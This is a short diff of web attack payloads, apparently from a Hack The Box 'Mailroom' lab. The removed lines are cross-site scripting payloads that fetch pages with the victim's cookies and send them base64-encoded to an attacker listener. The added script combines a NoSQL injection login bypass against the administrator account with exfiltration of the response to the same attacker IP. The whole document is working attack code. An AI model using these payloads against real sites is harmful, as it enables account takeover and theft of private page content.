@@ -1,6 +1,11 @@
 http://staff-review-panel.mailroom.htb/auth.php?token=
 
-<img src=0 onerror="fetch('/index.php',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://10.10.16.180:4444/?d='+btoa(unescape(encodeURIComponent(d)))))">
-<img src=0 onerror="fetch('http://staff-review-panel.mailroom.htb/',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://10.10.16.180:4444/', {
-    method: 'POST',
-    body: btoa(unescape(encodeURIComponent(d)))">`
+<script>
+x=new XMLHttpRequest();
+x.open('POST','http://staff-review-panel.mailroom.htb/auth.php');
+x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+x.onload=function(){
+    fetch('http://10.10.16.180:4443/'+btoa(this.responseText));
+};
+x.send('email=administrator@mailroom.htb&password[$ne]=admin');
+</script>
